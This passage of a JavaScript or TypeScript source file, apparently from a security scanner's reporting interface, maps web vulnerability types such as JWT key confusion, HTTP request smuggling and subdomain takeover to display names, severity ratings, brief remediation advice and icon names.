  mass_assignment: { name: "Mass Assignment", description: "Object properties can be overwritten.", severity: "high", recommendation: "Whitelist allowed properties.", icon: "Settings" },
  insecure_deserialization: { name: "Insecure Deserialization", description: "Malicious serialized objects can execute code.", severity: "critical", recommendation: "Never deserialize untrusted data.", icon: "FileCode" },
  object_injection: { name: "Object Injection", description: "Objects can be injected through user input.", severity: "critical", recommendation: "Validate all object structures.", icon: "FileCode" },
  host_header_injection: { name: "Host Header Injection", description: "Host headers can be manipulated for attacks.", severity: "medium", recommendation: "Validate Host headers.", icon: "Globe" },
  jwt_none_algorithm: { name: "JWT None Algorithm", description: "JWT tokens accept none algorithm.", severity: "critical", recommendation: "Reject none algorithm.", icon: "Key" },
  jwt_key_confusion: { name: "JWT Key Confusion", description: "JWT keys can be confused between algorithms.", severity: "critical", recommendation: "Use consistent key types.", icon: "Key" },
  url_manipulation: { name: "URL Manipulation", description: "URLs can be manipulated for unauthorized access.", severity: "medium", recommendation: "Validate all URL parameters.", icon: "ExternalLink" },
  race_condition: { name: "Race Condition", description: "Concurrent requests can cause unexpected behavior.", severity: "high", recommendation: "Use proper locking mechanisms.", icon: "Clock" },
  business_logic_flaw: { name: "Business Logic Flaw", description: "Application logic can be exploited.", severity: "high", recommendation: "Review business logic carefully.", icon: "Settings" },
  information_disclosure: { name: "Information Disclosure", description: "Sensitive information is exposed.", severity: "medium", recommendation: "Remove sensitive data from responses.", icon: "Eye" },
  verb_tampering: { name: "HTTP Verb Tampering", description: "HTTP methods can be manipulated.", severity: "medium", recommendation: "Restrict allowed HTTP methods.", icon: "FileCode" },
  cache_poisoning: { name: "Cache Poisoning", description: "Cache can be poisoned with malicious content.", severity: "high", recommendation: "Validate cache keys.", icon: "Archive" },
  web_cache_deception: { name: "Web Cache Deception", description: "Sensitive pages can be cached.", severity: "medium", recommendation: "Configure cache controls properly.", icon: "Archive" },
  subdomain_takeover: { name: "Subdomain Takeover", description: "Unused subdomains can be hijacked.", severity: "high", recommendation: "Remove unused DNS records.", icon: "Globe" },
  dns_rebinding: { name: "DNS Rebinding", description: "DNS can be manipulated to bypass same-origin.", severity: "high", recommendation: "Validate Host headers.", icon: "Globe" },
  request_smuggling: { name: "HTTP Request Smuggling", description: "HTTP requests can be smuggled through proxies.", severity: "critical", recommendation: "Use consistent parsing.", icon: "FileCode" },
  http_response_splitting: { name: "HTTP Response Splitting", description: "HTTP responses can be split.", severity: "high", recommendation: "Sanitize headers.", icon: "FileCode" },
  session_fixation: { name: "Session Fixation", description: "Sessions can be fixed by attackers.", severity: "high", recommendation: "Regenerate session IDs.", icon: "Key" },
  weak_password_policy: { name: "Weak Password Policy", description: "Password requirements are insufficient.", severity: "medium", recommendation: "Enforce strong passwords.", icon: "Key" },
  brute_force: { name: "Brute Force", description: "Credentials can be guessed through brute force.", severity: "medium", recommendation: "Implement rate limiting.", icon: "Shield" },
  rate_limit_bypass: { name: "Rate Limit Bypass", description: "Rate limiting can be bypassed.", severity: "medium", recommendation: "Use robust rate limiting.", icon: "Shield" },
  captcha_bypass: { name: "CAPTCHA Bypass", description: "CAPTCHA protection can be bypassed.", severity: "medium", recommendation: "Use strong CAPTCHA.", icon: "Shield" },
  sensitive_files: { name: "Sensitive Files Exposed", description: "Sensitive files are accessible.", severity: "high", recommendation: "Restrict access to sensitive files.", icon: "FileWarning" },
  exposed_api: { name: "Exposed API", description: "API endpoints are publicly accessible.", severity: "medium", recommendation: "Implement API authentication.", icon: "Globe" },
  debug_enabled: { name: "Debug Mode Enabled", description: "Debug mode is enabled in production.", severity: "medium", recommendation: "Disable debug mode.", icon: "Settings" },
  default_credentials: { name: "Default Credentials", description: "Default credentials are in use.", severity: "critical", recommendation: "Change default credentials.", icon: "Key" },
};
